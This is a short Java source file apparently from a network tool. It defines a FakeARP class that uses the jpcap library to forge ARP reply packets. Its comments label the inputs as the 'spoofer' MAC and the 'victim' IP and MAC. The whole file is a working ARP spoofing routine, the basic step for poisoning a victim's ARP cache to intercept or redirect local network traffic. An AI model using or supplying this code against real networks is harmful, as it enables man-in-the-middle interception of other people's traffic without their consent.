package tools;

import jpcap.JpcapSender;
import jpcap.packet.ARPPacket;
import jpcap.packet.EthernetPacket;

public class FakeARP {
	
	static JpcapSender sender;
	
	/**
	 * This class send custom ARP packet
	 * @param sender from capture.getJpcapSenderInstance()
	 */
	public FakeARP(JpcapSender sender) {
		this.sender = sender;
	}
	
	/**
	 * Craft and send the custom ARP packet
	 * @param sourceIP requested IP
	 * @param sourceMAC spoofer MAC
	 * @param destIP victim IP
	 * @param destMAC victim MAC
	 */
	public void send(byte[] sourceIP, byte[] sourceMAC, byte[] destIP, byte[] destMAC) {
		
		// craft the arp packet
		ARPPacket arp = new ARPPacket();
		arp.hardtype = ARPPacket.HARDTYPE_ETHER;
		arp.prototype = ARPPacket.PROTOTYPE_IP;
		arp.operation = ARPPacket.ARP_REPLY;
		arp.hlen = 6; // mac address length
		arp.plen = 4; // ip address length
		arp.sender_hardaddr = sourceMAC;
		arp.sender_protoaddr = sourceIP;
		arp.target_hardaddr = destMAC;
		arp.target_protoaddr = destIP;
		
		// craft the ethernet packet
		EthernetPacket eth = new EthernetPacket();
		eth.frametype = EthernetPacket.ETHERTYPE_ARP;
		eth.src_mac = sourceMAC;
		eth.dst_mac = destMAC;
		arp.datalink = eth;
		sender.sendPacket(arp);
	}

}
